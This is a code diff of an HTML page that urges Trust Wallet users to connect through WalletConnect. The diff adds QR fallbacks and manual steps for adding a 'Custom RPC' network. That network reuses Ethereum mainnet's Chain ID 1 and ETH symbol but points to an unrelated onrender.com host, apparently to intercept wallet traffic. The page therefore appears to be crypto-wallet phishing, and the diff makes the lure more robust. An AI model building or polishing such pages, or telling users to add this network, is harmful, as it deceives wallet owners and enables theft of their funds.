@@ -18,104 +18,167 @@
             text-align: center;
         }
         .container {
-            max-width: 400px;
+            max-width: 450px;
             background: rgba(255,255,255,0.1);
             backdrop-filter: blur(10px);
             border-radius: 30px;
             padding: 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 16px;
-            line-height: 1.5;
-            opacity: 0.9;
-        }
+        h1 { font-size: 28px; margin-bottom: 10px; }
+        p { font-size: 16px; line-height: 1.5; opacity: 0.9; }
         .button {
-            display: inline-block;
+            display: block;
             background: white;
             color: #333;
-            padding: 15px 30px;
+            padding: 15px 20px;
             border-radius: 30px;
             font-size: 18px;
             font-weight: 600;
             text-decoration: none;
-            margin-top: 20px;
+            margin: 15px 0;
             width: 100%;
             box-sizing: border-box;
             border: none;
             cursor: pointer;
+            transition: background 0.3s;
         }
-        .button:hover {
-            background: #f0f0f0;
-        }
-        .note {
-            font-size: 14px;
-            margin-top: 20px;
-            opacity: 0.8;
-        }
-        #loading {
-            display: none;
-            margin-top: 20px;
-        }
+        .button:hover { background: #f0f0f0; }
+        .button:disabled { background: #ccc; cursor: not-allowed; }
         .error {
-            color: #ffcccb;
             background: rgba(255,0,0,0.2);
             padding: 10px;
             border-radius: 10px;
-            margin-top: 15px;
+            margin: 15px 0;
+            color: #ffcccb;
+        }
+        .success {
+            background: rgba(0,255,0,0.2);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 15px 0;
+            color: #ccffcc;
+        }
+        #loading { display: none; margin: 10px 0; }
+        #qr-container {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: white;
+            border-radius: 20px;
+            color: #333;
+        }
+        #qr-code canvas, #qr-code img {
+            width: 200px;
+            height: 200px;
+            margin: 10px auto;
+        }
+        .uri-display {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        .manual-step {
+            text-align: left;
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 15px;
+            margin-top: 20px;
         }
     </style>
     <!-- Try multiple CDNs for WalletConnect -->
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
     <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
+    <script src="https://esm.sh/@walletconnect/ethereum-provider@2.11.0?target=es2020"></script>
+    <!-- QR Code library (always needed) -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     <script>
-        // Fallback if library not loaded after 2 seconds
-        window.libLoaded = false;
-        function checkLibrary() {
+        // Library loaded flag
+        window.wcLoaded = false;
+        window.qrLoaded = false;
+
+        function checkLibraries() {
             if (typeof window.EthereumProvider !== 'undefined') {
-                window.libLoaded = true;
+                window.wcLoaded = true;
                 console.log('✅ WalletConnect library loaded');
-            } else {
-                document.getElementById('errorMsg').innerText = '❌ Failed to load WalletConnect library. Please check your internet or try again later.';
+            }
+            if (typeof window.QRCode !== 'undefined') {
+                window.qrLoaded = true;
+                console.log('✅ QRCode library loaded');
+            }
+            if (!window.wcLoaded) {
+                document.getElementById('errorMsg').innerHTML = '❌ WalletConnect library failed to load. Please check your internet or use the manual options below.';
                 document.getElementById('connectBtn').disabled = true;
+                document.getElementById('retryBtn').style.display = 'block';
+            } else {
+                document.getElementById('connectBtn').disabled = false;
+            }
+            if (!window.qrLoaded) {
+                document.getElementById('errorMsg').innerHTML += '<br>⚠️ QR library also failed – some features may not work.';
             }
         }
-        setTimeout(checkLibrary, 2000);
+        setTimeout(checkLibraries, 3000);
     </script>
 </head>
 <body>
     <div class="container">
         <h1>🔗 Connect Trust Wallet</h1>
-        <p>Tap the button below to connect to the custom RPC network:</p>
+        <p>Use the button below to instantly connect to:</p>
         <p style="font-size:14px; word-break:break-all;">https://express-shipping-mcu1.onrender.com</p>
-        <button class="button" id="connectBtn">Connect Now</button>
+        <p><small>Chain ID: 1 | Symbol: ETH</small></p>
+
+        <button class="button" id="connectBtn" onclick="connectWallet()">Connect Now</button>
+        <button class="button" id="retryBtn" style="display:none; background:#ffc107;" onclick="retryLoad()">Retry Loading Library</button>
         <div id="loading">⏳ Generating connection request...</div>
         <div id="errorMsg" class="error"></div>
-        <p class="note">If Trust Wallet is not installed, you'll be redirected to the app store.</p>
+
+        <!-- QR code container (fallback) -->
+        <div id="qr-container">
+            <h3>📱 Scan with Trust Wallet</h3>
+            <div id="qr-code"></div>
+            <div class="uri-display" id="wc-uri"></div>
+            <button class="button" onclick="copyURI()" style="background:#6c5ce7;">Copy Link</button>
+        </div>
+
+        <!-- Manual network addition instructions -->
+        <div class="manual-step">
+            <h3>📲 Manual Setup</h3>
+            <p>If automatic connection fails, add the network manually in Trust Wallet:</p>
+            <ol style="text-align:left; font-size:14px;">
+                <li>Open Trust Wallet → Settings → Networks → Add Network</li>
+                <li><strong>Network Name:</strong> Custom RPC</li>
+                <li><strong>RPC URL:</strong> https://express-shipping-mcu1.onrender.com</li>
+                <li><strong>Chain ID:</strong> 1</li>
+                <li><strong>Symbol:</strong> ETH</li>
+                <li>Save and switch to this network</li>
+                <li>Then use the "Connect Now" button again (after adding)</li>
+            </ol>
+        </div>
     </div>
 
     <script>
-        const PROJECT_ID = "cd1a5ec0393767579e1f364ffc41597d"; // Your WalletConnect project ID
+        const PROJECT_ID = "cd1a5ec0393767579e1f364ffc41597d";
         const RPC_URL = "https://express-shipping-mcu1.onrender.com";
 
-        document.getElementById('connectBtn').addEventListener('click', async () => {
-            if (!window.libLoaded) {
-                alert('Library not loaded yet. Please wait a moment and try again.');
+        async function connectWallet() {
+            if (!window.wcLoaded) {
+                document.getElementById('errorMsg').innerText = 'Library still loading. Please wait a few seconds and try again.';
                 return;
             }
 
             const btn = document.getElementById('connectBtn');
             const loading = document.getElementById('loading');
+            const errorDiv = document.getElementById('errorMsg');
             btn.disabled = true;
             btn.textContent = 'Connecting...';
             loading.style.display = 'block';
+            errorDiv.innerHTML = '';
 
             try {
-                // Initialize provider without showing modal
+                // Initialize provider
                 const provider = await window.EthereumProvider.init({
                     projectId: PROJECT_ID,
                     chains: [1],
@@ -130,34 +193,53 @@
                     }
                 });
 
-                // Wait for the URI
+                // Get URI
                 const uri = await new Promise((resolve) => {
                     provider.once('display_uri', resolve);
                     provider.connect().catch(() => {});
                 });
 
-                // Redirect to Trust Wallet deep link
+                // Try deep link
                 const trustLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                 window.location.href = trustLink;
 
-                // Fallback if not opened
+                // Also show QR in case deep link fails
+                if (window.qrLoaded) {
+                    document.getElementById('qr-container').style.display = 'block';
+                    document.getElementById('wc-uri').innerText = uri;
+                    QRCode.toCanvas(document.getElementById('qr-code'), uri, { width: 200 }, (err) => {
+                        if (err) console.error(err);
+                    });
+                }
+
+                // Fallback message
                 setTimeout(() => {
                     if (!document.hidden) {
-                        alert('If Trust Wallet did not open, tap the button again or install Trust Wallet from the app store.');
-                        btn.disabled = false;
-                        btn.textContent = 'Try Again';
-                        loading.style.display = 'none';
+                        errorDiv.innerHTML = '⚠️ Trust Wallet did not open automatically. Use the QR code above or try manual setup.';
                     }
                 }, 2000);
 
             } catch (error) {
                 console.error(error);
-                alert('Connection failed: ' + error.message);
+                errorDiv.innerHTML = '❌ Connection error: ' + error.message;
                 btn.disabled = false;
-                btn.textContent = 'Connect Now';
+                btn.textContent = 'Try Again';
                 loading.style.display = 'none';
             }
-        });
+        }
+
+        function retryLoad() {
+            location.reload();
+        }
+
+        function copyURI() {
+            const uri = document.getElementById('wc-uri').innerText;
+            if (uri) {
+                navigator.clipboard.writeText(uri).then(() => {
+                    alert('URI copied! You can paste it in Trust Wallet manually.');
+                });
+            }
+        }
     </script>
 </body>
 </html>
